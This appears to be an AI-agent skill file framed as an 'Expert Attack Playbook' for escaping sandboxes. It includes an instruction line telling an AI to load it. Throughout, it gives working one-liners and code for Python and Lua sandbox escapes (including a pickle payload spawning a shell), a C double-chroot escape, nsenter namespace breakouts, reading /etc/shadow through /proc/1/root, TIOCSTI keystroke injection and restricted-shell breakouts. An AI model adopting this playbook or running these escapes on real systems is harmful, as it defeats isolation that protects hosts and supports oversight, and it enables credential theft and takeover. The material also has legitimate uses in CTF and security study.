---
name: sandbox-escape-techniques
description: >-
  Sandbox escape playbook. Use when breaking out of Python sandbox, Lua sandbox, seccomp filter, chroot jail, container/Docker, browser sandbox, or namespace isolation.
---

# SKILL: Sandbox Escape — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert sandbox escape across Python, Lua, seccomp, chroot, Docker/container, and browser sandbox. Covers CTF pyjail patterns, seccomp architecture confusion, chroot fd leaks, namespace escape, and Mojo IPC abuse.

## 0. RELATED ROUTING

- [browser-exploitation-v8](../browser-exploitation-v8/SKILL.md) — V8 exploitation for renderer RCE
- [container-escape-techniques](../container-escape-techniques/SKILL.md) — Docker/container specific escapes
- [kernel-exploitation](../kernel-exploitation/SKILL.md) — kernel exploit for namespace escape
- [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) — Full pyjail methodology
- [SECCOMP_BYPASS.md](./SECCOMP_BYPASS.md) — Architecture confusion, io_uring, ptrace bypass

---

## 1. SANDBOX TYPE IDENTIFICATION

| Sandbox Type | Indicators | Typical Context |
|---|---|---|
| Python sandbox (pyjail) | Limited builtins, filtered keywords | CTF, online judges, Jupyter |
| Lua sandbox | No `os`, `io` modules; restricted metatables | Game scripting, config |
| seccomp | syscall filtering, `prctl(PR_SET_SECCOMP)` | CTF pwn, container hardening |
| chroot | Changed root filesystem | Legacy isolation |
| Docker/container | Namespaces, cgroups, reduced capabilities | Cloud, microservices |
| Browser (renderer) | seccomp-bpf + namespaces | Chrome, Firefox |

---

## 2. PYTHON SANDBOX ESCAPE (OVERVIEW)

| Technique | One-Liner |
|---|---|
| Subclass walk | `().__class__.__bases__[0].__subclasses__()` → find `os._wrap_close` → `__init__.__globals__['system']` |
| Import recovery | `__builtins__.__import__('os').system('sh')` |
| getattr bypass | `getattr(getattr(__builtins__, '__imp'+'ort__'), '__call__')('os')` |
| chr construction | `eval(chr(95)+chr(95)+'import'+chr(95)+chr(95))` |
| Pickle escape | `pickle.loads(b"cos\nsystem\n(S'sh'\ntR.")` |
| Code object | Construct `types.CodeType(...)` then `exec()` with custom bytecode |

See [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) for full methodology.

---

## 3. LUA SANDBOX ESCAPE

```lua
-- debug library:
debug.getregistry()          -- access global registry
debug.getupvalue(func, 1)    -- read closed-over variables
debug.setupvalue(func, 1, val) -- overwrite upvalues

-- loadstring:
loadstring("os.execute('sh')")()

-- LuaJIT FFI:
local ffi = require("ffi")
ffi.cdef[[ int system(const char *command); ]]
ffi.C.system("sh")
```

---

## 4. CHROOT ESCAPE

| Technique | Condition | Method |
|---|---|---|
| Double chroot | Root inside chroot | `mkdir x; chroot x; chdir ../../..` then `chroot .` |
| Open fd to real root | Leaked fd from outside | `fchdir(leaked_fd)` then `chroot(".")` |
| TIOCSTI ioctl | Terminal TTY access | Inject keystrokes to parent shell |
| /proc access | `/proc` mounted inside | `/proc/1/root/` → real root filesystem |

```c
// Double chroot escape (must be root inside chroot)
mkdir("/tmp/escape", 0755);
chroot("/tmp/escape");
for (int i = 0; i < 100; i++) chdir("..");
chroot(".");  // now at real root
execl("/bin/sh", "sh", NULL);
```

---

## 5. BROWSER SANDBOX ESCAPE

```
Chrome Renderer Process:
  ├── seccomp-bpf (syscall filter)
  ├── PID namespace
  ├── Network namespace
  └── Reduced capabilities
```

| Vector | Description |
|---|---|
| Mojo IPC bug | UAF/type confusion in Mojo interface handler in browser process |
| GPU process bug | Less-sandboxed stepping stone |
| Kernel exploit | Bypasses all sandboxing |

Mojo attack: renderer RCE → find vulnerable Mojo interface → UAF in browser process → full system access.

---

## 6. NAMESPACE ESCAPE

```bash
# User namespace (if allowed):
unshare -Urm  # new user + mount namespace as root inside

# PID namespace (misconfigured container):
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Mount namespace (read host files):
ls -la /proc/1/root/
cat /proc/1/root/etc/shadow
```

---

## 7. RBASH / RESTRICTED SHELL ESCAPE

| Technique | Method |
|---|---|
| vi/vim | `:!/bin/bash` or `:set shell=/bin/bash` then `:shell` |
| less/more | `!/bin/bash` |
| awk | `awk 'BEGIN {system("/bin/bash")}'` |
| python | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| git | `git help config` → `!/bin/bash` in pager |
| find | `find / -exec /bin/bash \;` |

---

## 8. DECISION TREE

```
Sandbox type?
├── Python pyjail → subclass walk → chr()/getattr() if keywords filtered
├── Lua → debug lib → FFI (LuaJIT) → loadstring → metatable chain
├── seccomp → SECCOMP_BYPASS.md (arch confusion, io_uring, ORW chain)
├── chroot → root? double chroot; leaked fd? fchdir; /proc mounted? /proc/1/root
├── Container/Docker → privileged? mount host; docker.sock? API escape; kernel exploit
├── Browser → renderer RCE? Mojo IPC; GPU process; kernel exploit
└── rbash → vi/less/python/awk/git interactive programs
```
